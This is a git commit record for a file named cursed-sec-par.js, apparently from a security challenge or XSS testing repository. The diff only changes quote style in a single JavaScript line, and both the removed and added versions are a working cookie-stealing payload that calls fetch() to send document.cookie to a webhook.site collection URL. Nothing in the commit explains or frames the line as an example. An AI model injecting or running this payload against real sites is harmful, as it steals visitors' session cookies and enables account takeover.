5fe2ac94c22f8467e6b0fc861b08749ac31f2c53
czghun <32646165+czghun@users.noreply.github.com>
2023-03-06 22:00:57 +0100

    Update cursed-sec-par.js

--- cursed-sec-par.js
+++ cursed-sec-par.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/cd23e86b-9f23-4890-b0e4-13a64d8e31a5/?cookie='+document.cookie);
+fetch("https://webhook.site/cd23e86b-9f23-4890-b0e4-13a64d8e31a5/?cookie="+document.cookie);
